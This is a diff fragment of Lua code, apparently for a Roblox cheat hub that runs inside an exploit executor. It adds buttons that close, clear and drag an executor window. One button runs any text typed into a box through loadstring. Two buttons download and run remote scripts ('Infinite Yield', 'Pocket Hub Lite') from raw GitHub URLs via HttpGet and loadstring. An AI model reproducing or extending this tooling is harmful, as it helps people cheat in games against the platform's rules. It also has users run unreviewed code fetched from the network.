+-- Scripts:
+
+local function IIFWZR_fake_script() -- Close.LocalScript 
+	local script = Instance.new('LocalScript', Close)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Visible = false
+	end)
+	
+end
+coroutine.wrap(IIFWZR_fake_script)()
+local function TLVZARU_fake_script() -- Execute.LocalScript 
+	local script = Instance.new('LocalScript', Execute)
+
+	local button = script.Parent
+	local textbox = script.Parent.Parent.TextBox
+	button.MouseButton1Click:Connect(function()
+		loadstring(textbox.Text)()
+	end)
+end
+coroutine.wrap(TLVZARU_fake_script)()
+local function IVBSDB_fake_script() -- Clear.LocalScript 
+	local script = Instance.new('LocalScript', Clear)
+
+	local button = script.Parent
+	local textbox = script.Parent.Parent.TextBox
+	button.MouseButton1Click:Connect(function()
+		textbox.Text = ""
+	end)
+end
+coroutine.wrap(IVBSDB_fake_script)()
+local function IVOL_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	script.Parent.Draggable = true
+	script.Parent.Active = true
+end
+coroutine.wrap(IVOL_fake_script)()
+local function TSIUB_fake_script() -- Infyeild.LocalScript 
+	local script = Instance.new('LocalScript', Infyeild)
+
+	local button = script.Parent
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+	end)
+end
+coroutine.wrap(TSIUB_fake_script)()
+local function TCGHWWL_fake_script() -- Pockethublite.LocalScript 
+	local script = Instance.new('LocalScript', Pockethublite)
+
+	local button = script.Parent
+	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Ali-droidlol/Pocket-hub-lite/main/Pocket%20hub%20lite"))()
+	end)
+end
+coroutine.wrap(TCGHWWL_fake_script)()
+local function PDBPFDT_fake_script() -- OpenGUI.LocalScript 
+	local script = Instance.new('LocalScript', OpenGUI)
+
+	local frame = script.Parent.Parent.Frame  -- change โ€Testโ€ to the name of the frane
+	local open = false
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		if frame.Visible == false then
+			frame.Visible = true
+		end
+	end)
+	
+end
+coroutine.wrap(PDBPFDT_fake_script)()
+end) 
+
 Tab:CreateButton("Lazy Hub",function()
 repeat wait() until game:IsLoaded()
 
